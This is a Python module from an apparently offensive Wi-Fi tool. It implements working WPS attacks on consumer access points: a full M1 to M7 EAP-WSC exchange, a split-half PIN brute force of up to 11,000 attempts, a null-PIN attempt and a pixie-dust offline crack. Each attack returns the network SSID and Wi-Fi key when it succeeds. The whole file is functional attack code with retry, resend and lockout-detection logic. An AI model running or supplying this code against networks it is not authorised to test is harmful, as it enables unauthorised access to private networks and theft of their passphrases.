"""Native WPS PIN attack: association + EAP-WSC exchange + split-half bruteforce."""

from __future__ import annotations

import os
import threading
import time
from dataclasses import dataclass
from enum import Enum

from scapy.layers.dot11 import Dot11AssoResp, Dot11Auth, Dot11Elt
from scapy.sendrecv import AsyncSniffer, sendp

from ..frames import assoc_resp_status, craft_assoc_req, craft_auth
from ..radio import ensure_channel, get_mac
from ..wps import eap, messages, tlv
from ..wps.crypto import (
    DerivedKeys,
    DHKeypair,
    dhkey,
    pin_checksum,
    psk_half,
    split_pin,
)
from ..wps.messages import build_assoc_wps_ie, compute_r_hashes
from ..wps.pixie import pixie_dust


def _wps_assoc_ie() -> Dot11Elt:
    """A fresh WPS Enrollee IE for one association attempt (fresh UUID-E
    each time — matches n1/n2/uuid_r being freshly generated per attempt
    elsewhere in this module, no reason for this one to be static)."""
    return Dot11Elt(ID=221, info=build_assoc_wps_ie(os.urandom(16)))


def _send_wsc_message(
    iface: str, bssid: str, client: str, identifier: int, opcode: int, payload: bytes,
    version: int = 1, frag_ack_timeout: float = 2.0,
) -> None:
    """Send a WSC message (M2/M4/M6), fragmenting per the WSC spec and
    waiting for a WSC_FRAG_ACK between all but the last piece if the
    payload doesn't fit in one EAP frame.

    A no-op beyond a single sendp() when the payload fits in one fragment
    — true for every message this project builds today (M2's ~400-byte
    TLV body, the largest, is well under DEFAULT_WSC_FRAGMENT_MTU) — the
    multi-fragment path exists for protocol completeness against a
    message that doesn't, not because anything here currently needs it,
    and is not live-verified against a real AP.

    Raises RuntimeError if an intermediate fragment's ACK never arrives.
    """
    fragments = eap.fragment_wsc_vendor_payload(payload)
    bssid_lower = bssid.lower()
    for i, frag in enumerate(fragments):
        pkt = eap.craft_wsc_msg_fragment(bssid, client, identifier, opcode, frag, version=version)
        sendp(pkt, iface=iface, verbose=False)
        if i == len(fragments) - 1:
            return

        acked: list[bool] = []

        def _on_ack(p, acked=acked) -> None:
            if not p.addr2 or p.addr2.lower() != bssid_lower:
                return
            parsed = eap.parse_eap(p)
            if parsed and eap.is_frag_ack(parsed):
                acked.append(True)

        sniffer = AsyncSniffer(
            iface=iface, timeout=frag_ack_timeout, prn=_on_ack,
            stop_filter=lambda p, acked=acked: bool(acked), store=False,
        )
        sniffer.start()
        sniffer.join()
        if not acked:
            raise RuntimeError(
                f"no WSC_FRAG_ACK for fragment {i + 1}/{len(fragments)} "
                f"(opcode {opcode:#x})"
            )


class AttemptOutcome(Enum):
    FIRST_HALF_WRONG = "first_half_wrong"
    SECOND_HALF_WRONG = "second_half_wrong"
    SUCCESS = "success"
    TIMEOUT = "timeout"
    AP_SETUP_LOCKED = "ap_setup_locked"
    AUTH_FAILED = "auth_failed"
    ASSOC_FAILED = "assoc_failed"


@dataclass
class AttemptResult:
    outcome: AttemptOutcome
    ssid: str | None = None
    network_key: str | None = None
    detail: str | None = None  # human-readable specifics for AUTH_FAILED/ASSOC_FAILED


def _sniff_until(iface: str, timeout: float, handler, found: list, send_fn=None, stop_event=None):
    """Shared AsyncSniffer-plus-poll core for _wait_for/_wait_for_dot11.

    A plain `sniffer.join()` blocks for the FULL `timeout` (WPS steps use
    up to 60s for the M3 wait) with no way for an external Stop click to
    interrupt it -- confirmed as the actual cause of "Stop Attack does
    nothing during OMNI/WPS" (2026-08-27 user report): every individual
    wait in attempt_pin()/pixie_attempt() was blocking + stop_event-blind,
    so the *first* WPS step in flight when Stop was clicked would still
    run to its own timeout before anything downstream got a chance to
    notice. Polling in short slices (same pattern as capture_handshake()/
    capture_pmkid()) lets a mid-wait stop_event abort in ~50ms instead.
    """
    sniffer = AsyncSniffer(
        iface=iface, timeout=timeout, prn=handler,
        stop_filter=lambda p: bool(found), store=False,
    )
    sniffer.start()
    try:
        if send_fn is not None:
            # Give the capture thread a moment to start reading before
            # we transmit; 50 ms is enough on real hardware and still
            # negligible compared to AP processing time.
            time.sleep(0.05)
            send_fn()
        deadline = time.monotonic() + timeout
        while not found and time.monotonic() < deadline:
            if stop_event is not None and stop_event.is_set():
                break
            time.sleep(0.05)
    finally:
        try:
            sniffer.stop()
        except Exception:  # noqa: BLE001, S110 - stop can race with the sniffer's own timeout teardown
            pass
    return found[0] if found else None


def _wait_for(iface: str, bssid: str, client: str, matches, timeout: float, send_fn=None, stop_event=None):
    """Sniff for the next matching EAP frame genuinely sourced from bssid
    and destined to us.

    Monitor mode also captures our own just-transmitted frames (local
    TX echo) and frames the AP is exchanging with other stations. Without
    both a source-address check (addr2 == bssid) and a destination-address
    check (addr1 == client), `_wait_for` can catch our own outgoing message
    or a third-party exchange instead of the AP's actual reply to us,
    which reads as nonsensical/inconsistent results (e.g. "receiving" our
    own M2, or attributing another station's NACK to our session).

    `send_fn`, if given, is called after the capture thread has started.
    This prevents losing fast AP replies that can arrive within a few
    milliseconds (e.g. Authentication seq=2), before a send-then-sniff
    sequence can start listening.
    """
    found = []
    bssid_lower = bssid.lower()
    client_lower = client.lower()

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if not pkt.addr1 or pkt.addr1.lower() != client_lower:
            return
        parsed = eap.parse_eap(pkt)
        if parsed and matches(parsed):
            found.append(parsed)

    return _sniff_until(iface, timeout, handler, found, send_fn=send_fn, stop_event=stop_event)


def _wait_for_dot11(iface: str, bssid: str, client: str, layer, timeout: float, send_fn=None, stop_event=None):
    """Sniff for the next frame of `layer` genuinely sourced from bssid
    and destined to us (same TX-echo/third-party concern as `_wait_for`
    above, hence the addr2 + addr1 checks).

    `send_fn` is called after the sniffer starts; see `_wait_for`.
    """
    bssid_lower = bssid.lower()
    client_lower = client.lower()
    found = []

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if not pkt.addr1 or pkt.addr1.lower() != client_lower:
            return
        if pkt.haslayer(layer):
            found.append(pkt)

    return _sniff_until(iface, timeout, handler, found, send_fn=send_fn, stop_event=stop_event)


def _associate(
    iface: str, bssid: str, client: str, ssid: str, msg_timeout: float, pre_eapol_delay: float = 0.0,
    stop_event=None,
) -> tuple[AttemptOutcome, str] | None:
    """Open-system auth + WPS-marked association. Returns None on success,
    or (AttemptOutcome, detail) to bail out with.
    """
    auth_resp = _wait_for_dot11(
        iface, bssid, client, Dot11Auth, msg_timeout,
        send_fn=lambda: sendp(craft_auth(bssid, client), iface=iface, verbose=False),
        stop_event=stop_event,
    )
    if auth_resp is None:
        return AttemptOutcome.AUTH_FAILED, "no auth response received"
    status = auth_resp.getlayer(Dot11Auth).status
    if status != 0:
        return AttemptOutcome.AUTH_FAILED, f"auth rejected, status={status}"

    assoc_resp = _wait_for_dot11(
        iface, bssid, client, Dot11AssoResp, msg_timeout,
        send_fn=lambda: sendp(
            craft_assoc_req(bssid, client, ssid=ssid, extra_ies=[_wps_assoc_ie()]),
            iface=iface, verbose=False,
        ),
        stop_event=stop_event,
    )
    if assoc_resp is None:
        return AttemptOutcome.ASSOC_FAILED, "no assoc response received"
    status = assoc_resp_status(assoc_resp)
    if status != 0:
        return AttemptOutcome.ASSOC_FAILED, f"assoc rejected, status={status}"
    # A brief post-association pause was historically used because some APs
    # drop EAPOL-Start fired the instant the assoc-response arrives. Against
    # other APs the registrar sends EAP-Request/Identity unprompted within
    # milliseconds of association, so any delay causes us to miss it. Make
    # the delay optional (default 0) and let callers tune it if needed.
    if pre_eapol_delay > 0:
        time.sleep(pre_eapol_delay)
    return None


def _send_until_m3(
    iface: str, bssid: str, client: str, m2: bytes, identifier: int, timeout: float,
    resend_interval: float = 0.5, version: int = 1, send_fn=None, stop_event=None,
):
    """Wait for M3/NACK after M2, resending M2 proactively on a timer *and*
    reactively whenever the AP re-sends M1. Real WPS tools (reaver) do the
    same periodic resend rather than waiting passively, since some APs
    silently drop a lost M2 without retransmitting M1 either.

    This is the single longest wait in the exchange (timeout is at least
    60s, vs 5s for every other step) so stop_event support here matters
    most for a responsive Stop button.
    """
    bssid_lower = bssid.lower()
    client_lower = client.lower()
    result: dict = {}
    lock = threading.Lock()
    last_resend = [0.0]
    timer: threading.Timer | None = None
    stopped = threading.Event()

    def handler(pkt):
        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
            return
        if not pkt.addr1 or pkt.addr1.lower() != client_lower:
            return
        p = eap.parse_eap(pkt)
        if p is None or p.opcode not in (eap.WSC_OP_MSG, eap.WSC_OP_NACK):
            return
        if p.opcode == eap.WSC_OP_NACK or messages.is_m3(p.payload):
            with lock:
                result["frame"] = p
            stopped.set()
            return
        # Reactive resend on AP retransmitted M1 (it reuses M1's identifier).
        now = time.monotonic()
        if now - last_resend[0] > resend_interval:
            _send_wsc_message(iface, bssid, client, p.identifier, eap.WSC_OP_MSG, m2, version=version)
            last_resend[0] = now

    def _resend():
        with lock:
            if "frame" in result:
                return
        _send_wsc_message(iface, bssid, client, identifier, eap.WSC_OP_MSG, m2, version=version)
        last_resend[0] = time.monotonic()
        # Schedule the next resend unless the exchange has completed.
        nonlocal timer
        with lock:
            if "frame" not in result:
                timer = threading.Timer(resend_interval, _resend)
                timer.daemon = True
                timer.start()

    sniffer = AsyncSniffer(
        iface=iface, timeout=timeout, prn=handler,
        stop_filter=lambda p: "frame" in result, store=False,
    )
    sniffer.start()
    try:
        if send_fn is not None:
            time.sleep(0.05)
            send_fn()
        # First resend fires after resend_interval so the initial send_fn
        # has a fair chance to reach the AP first.
        timer = threading.Timer(resend_interval, _resend)
        timer.daemon = True
        timer.start()
        deadline = time.monotonic() + timeout
        while "frame" not in result and time.monotonic() < deadline:
            if stop_event is not None and stop_event.is_set():
                break
            time.sleep(0.05)
    finally:
        stopped.set()
        if timer is not None:
            timer.cancel()
        try:
            sniffer.stop()
        except Exception:  # noqa: BLE001, S110 - stop can race with the sniffer's own timeout teardown
            pass
    return result.get("frame")


def _send_eapol_start_adaptive(
    iface: str, bssid: str, client: str, msg_timeout: float,
    versions: tuple[int, ...] = (2, 1), passive: bool = False, stop_event=None,
):
    """Send EAPOL-Start, trying each protocol-version byte (1=2001, 2=2004,
    3=2010 -- some AP firmware silently drops the wrong one) in turn until
    one gets an EAP-Request/Identity back, or just listen if `passive`
    (some APs fire Identity unprompted right after association).

    Returns (version_used, id_req) on success, (None, None) on timeout/stop.
    """
    if passive:
        id_req = _wait_for(
            iface, bssid, client, lambda p: p.eap_type == eap.EAP_TYPE_IDENTITY, msg_timeout,
            stop_event=stop_event,
        )
        return (1, id_req) if id_req is not None else (None, None)

    per_version_timeout = max(msg_timeout / len(versions), 1.5)
    for version in versions:
        if stop_event is not None and stop_event.is_set():
            return None, None
        id_req = _wait_for(
            iface, bssid, client,
            lambda p: p.eap_type == eap.EAP_TYPE_IDENTITY,
            per_version_timeout,
            send_fn=lambda v=version: sendp(
                eap.craft_eapol_start(bssid, client, version=v), iface=iface, verbose=False,
            ),
            stop_event=stop_event,
        )
        if id_req is not None:
            return version, id_req
    return None, None


def attempt_pin(
    iface: str,
    bssid: str,
    pin8: str | None,
    ssid: str,
    channel: int | None = None,
    msg_timeout: float = 5.0,
    psk1_override: bytes | None = None,
    psk2_override: bytes | None = None,
    eapol_versions: tuple[int, ...] = (2, 1),
    passive: bool = False,
    pre_eapol_delay: float = 0.0,
    progress_fn=None,
    stop_event=None,
) -> AttemptResult:
    """Run one full association + M1..M7 cycle for a single 8-digit PIN guess.

    `psk1_override`/`psk2_override` bypass the normal split_pin(pin8) ->
    psk_half() derivation (used by the null-PIN attack, an empty PIN).

    Every exit path sends an explicit EAP-Failure instead of going silent,
    so an abandoned session doesn't leave the AP's WPS state machine stuck.
    """
    if psk1_override is None and pin8 is None:
        raise ValueError("attempt_pin needs either pin8 or both psk*_override")
    log = progress_fn or (lambda msg: None)
    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")
    client = get_mac(iface)
    last_identifier: int | None = None
    eapol_version = 1

    def finish(result: AttemptResult) -> AttemptResult:
        if last_identifier is not None:
            sendp(eap.craft_eap_failure(bssid, client, last_identifier, version=eapol_version), iface=iface, verbose=False)
        log(f"attempt result: {result.outcome.value}" + (f" ({result.detail})" if result.detail else ""))
        return result

    log(f"associating with {bssid}...")
    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout, pre_eapol_delay, stop_event=stop_event)
    if assoc_failure is not None:
        outcome, detail = assoc_failure
        return finish(AttemptResult(outcome, detail=detail))
    log("associated — starting EAPOL")

    eapol_version, id_req = _send_eapol_start_adaptive(
        iface, bssid, client, msg_timeout, eapol_versions, passive, stop_event=stop_event,
    )
    if id_req is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    last_identifier = id_req.identifier
    m1_frame = _wait_for(
        iface, bssid, client,
        lambda p: p.opcode in (eap.WSC_OP_START, eap.WSC_OP_MSG),
        msg_timeout,
        send_fn=lambda: sendp(
            eap.craft_eap_identity_response(
                bssid, client, id_req.identifier, tlv.WSC_REGISTRAR_IDENTITY, version=eapol_version,
            ),
            iface=iface, verbose=False,
        ),
        stop_event=stop_event,
    )
    if m1_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    last_identifier = m1_frame.identifier
    if m1_frame.opcode == eap.WSC_OP_START and not m1_frame.payload:
        m1_frame = _wait_for(
            iface, bssid, client, lambda p: p.opcode == eap.WSC_OP_MSG, msg_timeout,
            send_fn=lambda: sendp(
                eap.craft_wsc_msg(bssid, client, m1_frame.identifier, eap.WSC_OP_ACK, b"", version=eapol_version),
                iface=iface, verbose=False,
            ),
            stop_event=stop_event,
        )
        if m1_frame is None:
            return finish(AttemptResult(AttemptOutcome.TIMEOUT))
        last_identifier = m1_frame.identifier

    m1 = messages.parse_m1(m1_frame.payload)
    if m1 is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    if m1.ap_setup_locked:
        return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED))
    log("M1 received — sending M2")

    registrar = DHKeypair.generate()
    enrollee_mac = m1.mac_addr
    n2 = os.urandom(16)
    uuid_r = os.urandom(16)

    dh_key = dhkey(registrar.shared_secret(m1.pke))
    keys = DerivedKeys.derive(dh_key, m1.n1, enrollee_mac, n2)

    m2 = messages.build_m2(m1.n1, n2, uuid_r, registrar.public_bytes, m1.raw, keys.auth_key)

    # Some AP drivers retransmit M1 if they never accept M2 -- resend M2 on
    # each duplicate rather than wait passively (matches real WPS tools).
    m3_frame = _send_until_m3(
        iface, bssid, client, m2, identifier=m1_frame.identifier,
        timeout=max(msg_timeout, 60.0), version=eapol_version,
        send_fn=lambda: _send_wsc_message(iface, bssid, client, m1_frame.identifier, eap.WSC_OP_MSG, m2, version=eapol_version),
        stop_event=stop_event,
    )
    if m3_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    if m3_frame.opcode == eap.WSC_OP_NACK:
        cfg_err = messages.nack_config_error(m3_frame.payload)
        detail = f"WSC NACK after M2, config_error=0x{cfg_err:04x}" if cfg_err is not None else "WSC NACK after M2"
        if cfg_err == 0x000F:
            return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED, detail=detail))
        return finish(AttemptResult(AttemptOutcome.TIMEOUT, detail=detail))
    last_identifier = m3_frame.identifier
    log("M3 received — sending M4")

    if psk1_override is not None and psk2_override is not None:
        psk1, psk2 = psk1_override, psk2_override
    else:
        if pin8 is None:
            raise ValueError("attempt_pin needs either pin8 or both psk*_override")
        half1, half2 = split_pin(pin8)
        psk1 = psk_half(keys.auth_key, half1)
        psk2 = psk_half(keys.auth_key, half2)
    r_s1, r_s2 = os.urandom(16), os.urandom(16)
    r_hash1, r_hash2 = compute_r_hashes(keys.auth_key, r_s1, r_s2, psk1, psk2, m1.pke, registrar.public_bytes)

    m4 = messages.build_m4(m1.n1, r_hash1, r_hash2, r_s1, keys.key_wrap_key, m3_frame.payload, keys.auth_key)
    next_frame = _wait_for(
        iface, bssid, client,
        lambda p: p.opcode == eap.WSC_OP_NACK or (p.opcode == eap.WSC_OP_MSG and messages.is_m5(p.payload)),
        msg_timeout,
        send_fn=lambda: _send_wsc_message(iface, bssid, client, m3_frame.identifier, eap.WSC_OP_MSG, m4, version=eapol_version),
        stop_event=stop_event,
    )
    if next_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    last_identifier = next_frame.identifier
    if next_frame.opcode == eap.WSC_OP_NACK:
        return finish(AttemptResult(AttemptOutcome.FIRST_HALF_WRONG))
    log("M5 received (first half correct) — sending M6")

    m6 = messages.build_m6(m1.n1, r_s2, keys.key_wrap_key, next_frame.payload, keys.auth_key)
    final_frame = _wait_for(
        iface, bssid, client,
        lambda p: p.opcode == eap.WSC_OP_NACK or (p.opcode == eap.WSC_OP_MSG and messages.is_m7(p.payload)),
        msg_timeout,
        send_fn=lambda: _send_wsc_message(iface, bssid, client, next_frame.identifier, eap.WSC_OP_MSG, m6, version=eapol_version),
        stop_event=stop_event,
    )
    if final_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    last_identifier = final_frame.identifier
    if final_frame.opcode == eap.WSC_OP_NACK:
        return finish(AttemptResult(AttemptOutcome.SECOND_HALF_WRONG))

    creds = messages.parse_m7(final_frame.payload, keys.key_wrap_key)
    if creds is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    return finish(AttemptResult(AttemptOutcome.SUCCESS, ssid=creds.ssid, network_key=creds.network_key))


def pixie_attempt(
    iface: str,
    bssid: str,
    ssid: str,
    channel: int | None = None,
    msg_timeout: float = 5.0,
    timestamp: int | None = None,
    attempt_fn=None,
    eapol_versions: tuple[int, ...] = (2, 1),
    passive: bool = False,
    pre_eapol_delay: float = 0.0,
    progress_fn=None,
    stop_event=None,
) -> AttemptResult:
    """Pixie-dust offline WPS attack: M1->M2, wait for M3, extract the
    hashes, crack offline, then attempt_pin() with the found PIN to get
    real credentials. TIMEOUT if M3/hashes are missing, FIRST_HALF_WRONG
    if the offline crack finds no PIN, SUCCESS with real creds otherwise.
    """
    log = progress_fn or (lambda msg: None)
    if attempt_fn is None:
        attempt_fn = attempt_pin

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")
    log(f"associating with {bssid}...")

    client = get_mac(iface)
    msg_timeout_inner = max(msg_timeout, 5.0)

    _last_id: list[int | None] = [None]
    _last_client: list[str] = [client]
    eapol_version = 1

    def finish(r: AttemptResult) -> AttemptResult:
        # _last_id stays None if we never got far enough to open a real EAP
        # session (e.g. AUTH_FAILED/ASSOC_FAILED below) — nothing to close.
        # NOTE: this used to build the EAP-Failure packet and never send it
        # (no sendp call), so abandoned pixie sessions never actually told
        # the AP anything — silently fixed alongside the auth/assoc check.
        if _last_id[0] is not None:
            try:
                sendp(
                    eap.craft_eap_failure(bssid, _last_client[0], _last_id[0], version=eapol_version),
                    iface=iface, verbose=False,
                )
            except Exception:  # noqa: BLE001, S110 - best-effort session teardown
                pass
        return r

    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout_inner, pre_eapol_delay, stop_event=stop_event)
    if assoc_failure is not None:
        outcome, detail = assoc_failure
        log(f"association failed: {outcome.value} ({detail})")
        return finish(AttemptResult(outcome, detail=detail))
    log("associated — starting EAPOL")

    eapol_version, id_req = _send_eapol_start_adaptive(
        iface, bssid, client, msg_timeout_inner, eapol_versions, passive, stop_event=stop_event,
    )
    if id_req is None:
        return AttemptResult(AttemptOutcome.TIMEOUT)
    _last_id[0] = id_req.identifier
    m1_frame = _wait_for(
        iface, bssid, client,
        lambda p: p.opcode in (eap.WSC_OP_START, eap.WSC_OP_MSG),
        msg_timeout_inner,
        send_fn=lambda: sendp(
            eap.craft_eap_identity_response(
                bssid, client, id_req.identifier, tlv.WSC_REGISTRAR_IDENTITY, version=eapol_version,
            ),
            iface=iface, verbose=False,
        ),
        stop_event=stop_event,
    )
    if m1_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    _last_id[0] = m1_frame.identifier
    if m1_frame.opcode == eap.WSC_OP_START and not m1_frame.payload:
        m1_frame = _wait_for(
            iface, bssid, client, lambda p: p.opcode == eap.WSC_OP_MSG, msg_timeout_inner,
            send_fn=lambda: sendp(
                eap.craft_wsc_msg(bssid, client, m1_frame.identifier, eap.WSC_OP_ACK, b"", version=eapol_version),
                iface=iface, verbose=False,
            ),
            stop_event=stop_event,
        )
        if m1_frame is None:
            return finish(AttemptResult(AttemptOutcome.TIMEOUT))
        _last_id[0] = m1_frame.identifier

    m1 = messages.parse_m1(m1_frame.payload)
    if m1 is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    if m1.ap_setup_locked:
        log("AP Setup Locked (from M1)")
        return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED))
    log("M1 received — sending M2")

    registrar = DHKeypair.generate()
    n2 = os.urandom(16)
    uuid_r = os.urandom(16)
    dh_key = dhkey(registrar.shared_secret(m1.pke))
    keys = DerivedKeys.derive(dh_key, m1.n1, m1.mac_addr, n2)

    m2 = messages.build_m2(m1.n1, n2, uuid_r, registrar.public_bytes, m1.raw, keys.auth_key)
    m3_frame = _send_until_m3(
        iface, bssid, client, m2, identifier=m1_frame.identifier,
        timeout=max(msg_timeout_inner, 60.0), version=eapol_version,
        send_fn=lambda: _send_wsc_message(iface, bssid, client, m1_frame.identifier, eap.WSC_OP_MSG, m2, version=eapol_version),
        stop_event=stop_event,
    )
    if m3_frame is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    if m3_frame.opcode == eap.WSC_OP_NACK:
        # A NACK after M2 is usually "Setup Locked" (0x000f) or another
        # AP-side refusal to run a session, not a wrong PIN (that comes
        # after M4). Surface it accurately instead of a generic timeout.
        cfg_err = messages.nack_config_error(m3_frame.payload)
        detail = f"WSC NACK after M2, config_error=0x{cfg_err:04x}" if cfg_err is not None else "WSC NACK after M2"
        if cfg_err == 0x000F:
            return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED, detail=detail))
        return finish(AttemptResult(AttemptOutcome.TIMEOUT, detail=detail))
    _last_id[0] = m3_frame.identifier

    m3 = messages.parse_m3(m3_frame.payload)
    if m3 is None:
        return finish(AttemptResult(AttemptOutcome.TIMEOUT))
    log("M3 received — running pixie-dust offline crack")

    # Offline phase: try all pixie-dust modes
    ts = timestamp if timestamp is not None else int(time.time())
    pd = pixie_dust(
        e_nonce=m1.n1,
        auth_key=keys.auth_key,
        pke=m1.pke,
        pkr=registrar.public_bytes,
        e_hash1=m3.e_hash1,
        e_hash2=m3.e_hash2,
        timestamp=ts,
    )

    # Terminate this incomplete session cleanly before the next attempt
    try:
        sendp(
            eap.craft_eap_failure(bssid, client, m3_frame.identifier, version=eapol_version),
            iface=iface, verbose=False,
        )
    except Exception:  # noqa: BLE001, S110 - best-effort session teardown
        pass

    if pd.pin is None:
        log("pixie-dust found no vulnerable nonce — offline crack failed")
        return AttemptResult(AttemptOutcome.FIRST_HALF_WRONG)
    log(f"pixie-dust recovered PIN {pd.pin} — verifying with a full M1-M7 exchange")

    # Verify the found PIN with a full M1→M7 attempt to get real credentials.
    # Try the EAPOL version that just worked first (fresh association, so
    # not guaranteed to work again, but a reasonable first guess).
    result = attempt_fn(
        iface, bssid, pd.pin, ssid, channel=channel, msg_timeout=msg_timeout,
        eapol_versions=(eapol_version, *[v for v in eapol_versions if v != eapol_version]),
        passive=passive, pre_eapol_delay=pre_eapol_delay, progress_fn=progress_fn, stop_event=stop_event,
    )
    log(f"verification result: {result.outcome.value}")
    return result


def null_pin_attack(
    iface: str, bssid: str, ssid: str, channel: int | None = None, msg_timeout: float = 5.0,
    progress_fn=None, stop_event=None,
) -> AttemptResult:
    """Try a blank configured PIN (some AP firmware accepts it) via the
    same M1..M7 exchange as attempt_pin(), PSK1=PSK2=HMAC-SHA256(AuthKey, b"").
    """
    return attempt_pin(
        iface, bssid, None, ssid, channel=channel, msg_timeout=msg_timeout,
        psk1_override=b"", psk2_override=b"", progress_fn=progress_fn, stop_event=stop_event,
    )


@dataclass
class BruteforceResult:
    success: bool
    pin: str | None = None
    ssid: str | None = None
    network_key: str | None = None
    ap_setup_locked: bool = False
    aborted_lockout: bool = False
    attempts: int = 0
    via_null_pin: bool = False


def wps_pin_bruteforce(
    iface: str,
    bssid: str,
    ssid: str,
    channel: int | None = None,
    max_consecutive_timeouts: int = 3,
    stop_event=None,
    attempt_fn=attempt_pin,
    try_null_pin: bool = True,
    null_pin_fn=null_pin_attack,
    progress_fn=None,
) -> BruteforceResult:
    """Split-half PIN sweep: 0000-9999 first, then 000-999 (checksum derives digit 8).

    Tries the null-PIN attack first (one attempt, real signal either way)
    since it's free compared to the up-to-11,000-attempt sweep — matches
    how real WPS tools order this.

    progress_fn, if given, is called after every attempt (this is the
    longest-running, least-visible attack in the project — previously it
    logged nothing at all between start and the final result, even across
    an 11,000-attempt sweep that can run for hours) plus on every
    stop/lockout/phase-transition event.
    """
    log = progress_fn or (lambda msg: None)
    result = BruteforceResult(success=False)
    consecutive_timeouts = 0

    def _check_stop() -> bool:
        return stop_event is not None and stop_event.is_set()

    if try_null_pin and not _check_stop():
        log("trying null-PIN (free attempt before the real sweep)")
        null_outcome = null_pin_fn(iface, bssid, ssid, channel=channel, stop_event=stop_event)
        result.attempts += 1
        if null_outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
            log("AP Setup Locked (from null-PIN attempt) — aborting")
            result.ap_setup_locked = True
            return result
        if null_outcome.outcome is AttemptOutcome.SUCCESS:
            log("null-PIN succeeded — AP accepts a blank PIN")
            result.success = True
            result.pin = ""
            result.via_null_pin = True
            result.ssid, result.network_key = null_outcome.ssid, null_outcome.network_key
            return result
        log(f"null-PIN: {null_outcome.outcome.value} — starting the real sweep (up to 11,000 attempts)")
        # Any other outcome (wrong/timeout) is not a real PIN signal --
        # fall through to the normal sweep unconditionally.

    first_half: str | None = None
    for f in range(10000):
        if _check_stop():
            log(f"stopped during first-half sweep after {result.attempts} attempt(s)")
            return result
        pin8 = _probe_pin(f)
        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel, stop_event=stop_event)
        result.attempts += 1
        if result.attempts == 1 or result.attempts % 10 == 0 or outcome.outcome is not AttemptOutcome.FIRST_HALF_WRONG:
            log(f"attempt {result.attempts} (first-half {f}/10000): PIN {pin8} -> {outcome.outcome.value}")
        if outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
            log(f"AP Setup Locked after {result.attempts} attempt(s) — aborting")
            result.ap_setup_locked = True
            return result
        if outcome.outcome is AttemptOutcome.TIMEOUT:
            consecutive_timeouts += 1
            if consecutive_timeouts >= max_consecutive_timeouts:
                log(f"{consecutive_timeouts} consecutive timeouts — suspected lockout, aborting after {result.attempts} attempt(s)")
                result.aborted_lockout = True
                return result
            continue
        consecutive_timeouts = 0
        if outcome.outcome in (AttemptOutcome.SECOND_HALF_WRONG, AttemptOutcome.SUCCESS):
            first_half = f"{f:04d}"
            if outcome.outcome is AttemptOutcome.SUCCESS:
                log(f"PIN found: {pin8}")
                result.success = True
                result.pin = pin8
                result.ssid, result.network_key = outcome.ssid, outcome.network_key
                return result
            log(f"first half confirmed: {first_half} — starting second-half sweep (up to 1,000 attempts)")
            break
        # FIRST_HALF_WRONG: keep sweeping

    if first_half is None:
        log(f"exhausted 10,000 first-half attempts without a match ({result.attempts} total) — unexpected, aborting")
        return result  # exhausted 10000 without a first-half match (shouldn't happen)

    for s in range(1000):
        if _check_stop():
            log(f"stopped during second-half sweep after {result.attempts} attempt(s)")
            return result
        core7 = int(first_half) * 1000 + s
        checksum = pin_checksum(core7)
        pin8 = f"{core7:07d}{checksum}"
        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel, stop_event=stop_event)
        result.attempts += 1
        if s % 10 == 0 or outcome.outcome is AttemptOutcome.SUCCESS:
            log(f"attempt {result.attempts} (second-half {s}/1000): PIN {pin8} -> {outcome.outcome.value}")
        if outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
            log(f"AP Setup Locked after {result.attempts} attempt(s) — aborting")
            result.ap_setup_locked = True
            return result
        if outcome.outcome is AttemptOutcome.TIMEOUT:
            consecutive_timeouts += 1
            if consecutive_timeouts >= max_consecutive_timeouts:
                log(f"{consecutive_timeouts} consecutive timeouts — suspected lockout, aborting after {result.attempts} attempt(s)")
                result.aborted_lockout = True
                return result
            continue
        consecutive_timeouts = 0
        if outcome.outcome is AttemptOutcome.SUCCESS:
            log(f"PIN found: {pin8}")
            result.success = True
            result.pin = pin8
            result.ssid, result.network_key = outcome.ssid, outcome.network_key
            return result

    log(f"exhausted second-half sweep without a match ({result.attempts} total attempts)")
    return result


def _probe_pin(first4: int) -> str:
    """An 8-digit PIN guess for the first-half sweep (last 3 core digits fixed at 0)."""
    core7 = first4 * 1000
    checksum = pin_checksum(core7)
    return f"{core7:07d}{checksum}"
